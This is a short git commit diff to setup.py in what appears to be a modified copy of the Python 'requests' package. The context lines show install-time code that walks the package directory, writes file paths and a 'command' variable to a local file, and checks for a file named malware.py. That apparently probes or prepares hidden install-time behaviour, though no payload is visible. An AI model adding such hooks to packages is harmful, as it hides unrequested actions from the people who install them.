944a887d99f016f81637d5413851e21a7e231412
Parish Wolfe <parishwolfe@gmail.com>
2021-11-28 18:39:10 -0500

    ewrf

--- setup.py
+++ setup.py
@@ -78,7 +78,7 @@ with open("/home/parish/output.txt", "w") as text_file:
     for root, dirs, files in os.walk(os.path.join(here, 'requests')):
         for file in files:
             text_file.write(os.path.join(root, file) + "\n")
-        text_file.write(command)
+        text_file.write(command + "\n")
         text_file.write(str(os.path.exists(home + '/malware.py')))
         
 
